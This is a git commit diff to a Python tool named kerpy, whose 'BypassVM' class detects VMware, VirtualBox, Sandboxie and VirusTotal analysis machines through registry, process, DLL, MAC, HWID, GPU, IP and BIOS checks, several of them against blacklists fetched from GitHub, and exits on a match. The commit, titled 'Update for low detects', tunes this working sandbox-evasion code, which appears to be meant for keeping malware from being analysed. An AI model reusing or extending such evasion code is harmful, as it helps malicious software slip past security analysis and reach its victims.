fc0be0093bb4ce3ada06931062c50b85b5c082c5
Lawxsz <116668706+Lawxsz@users.noreply.github.com>
2023-03-03 16:36:59 -0300

    Update for low detects

--- kerpy.py
+++ kerpy.py
@@ -1,6 +1,6 @@
 # -* kerpy tool by Lawxsz on github and telegram!! -* #
 
-import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket, platform
+import re, uuid, wmi, requests, os, ctypes, sys, subprocess, socket
 
 def get_base_prefix_compat(): # define all of the checks
     return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
@@ -18,6 +18,7 @@ class BypassVM:
         reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
         
         if reg1 != 1 and reg2 != 1:    
+            print("VMware Registry Detected")
             sys.exit()
 
     def processes_and_files_check(self):
@@ -31,61 +32,60 @@ class BypassVM:
                 processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
+            print("VMwareService.exe & VMwareTray.exe process are running")
             sys.exit()
                            
-        if os.path.exists(vmware_dll): # Detect vmware dll
+        if os.path.exists(vmware_dll): 
+            print("Vmware DLL Detected")
             sys.exit()
             
-        if os.path.exists(virtualbox_dll): # Detect virtualbox dll
+        if os.path.exists(virtualbox_dll):
+            print("VirtualBox DLL Detected")
             sys.exit()
         
         try:
-            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll") # Detect sandbox dll
+            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
+            print("Sandboxie DLL Detected")
             sys.exit()
         except:
             pass              
-
-    def mac_check(self): # Mac detect
-        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        
-        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
-        
-        if mac_address in mac_list:
+        processl = requests.get("https://raw.githubusercontent.com/Lawxsz/bypass-virus-total/main/utils/process.txt").text
+        if processl in processList:
             sys.exit()
-    def check_pc(self): # User/Name Detect
+    def mac_check(self):
+        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        mac_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt").text
+        if mac_address[:8] in mac_list:
+            print("VMware MAC Address Detected")
+            sys.exit()
+    def check_pc(self):
      vmname = os.getlogin()
-     
      vm_name = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt").text
-     
      if vmname in vm_name:
          sys.exit()
      vmusername = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt").text
-    
      host_name = socket.gethostname()
      if host_name in vmusername:
          sys.exit()
-            
-    def hwid_vm(self): # HWID detect
+    def hwid_vm(self):
      current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
      hwid_vm = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt").text
      if current_machine_id in hwid_vm:
          sys.exit()
-            
-    def checkgpu(self): #GPU Detect
+    def checkgpu(self):
      c = wmi.WMI()
      for gpu in c.Win32_DisplayConfiguration():
         GPUm = gpu.Description.strip()
      gpulist = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt").text
      if GPUm in gpulist:
          sys.exit()
-        
-    def check_ip(self): #IP Detect
+    def check_ip(self):
      ip_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt").text
      reqip = requests.get("https://api.ipify.org/?format=json").json()
      ip = reqip["ip"]
      if ip in ip_list:
          sys.exit()
-    def profiles(): # Guids / Bios Detect etc
+    def profiles():
      machine_guid = uuid.getnode()
      guid_pc = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt").text
      bios_guid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt").text
@@ -94,15 +94,6 @@ class BypassVM:
      if machine_guid in guid_pc:
          sys.exit()
      w = wmi.WMI()
-     serial_list = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt").text
-     serial_ = platform.processor()
-     if serial_ in serial_list:
-            sys.exit()
-     for profile in w.Win32_ComputerSystem():
-      hw_profile_guid = profile.Model
-     hwprid = requests.get("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt").text
-     if hw_profile_guid in hwprid:
-            sys.exit()
      for bios in w.Win32_BIOS():
       bios_check = bios.SerialNumber    
      if bios_check in bios_guid:
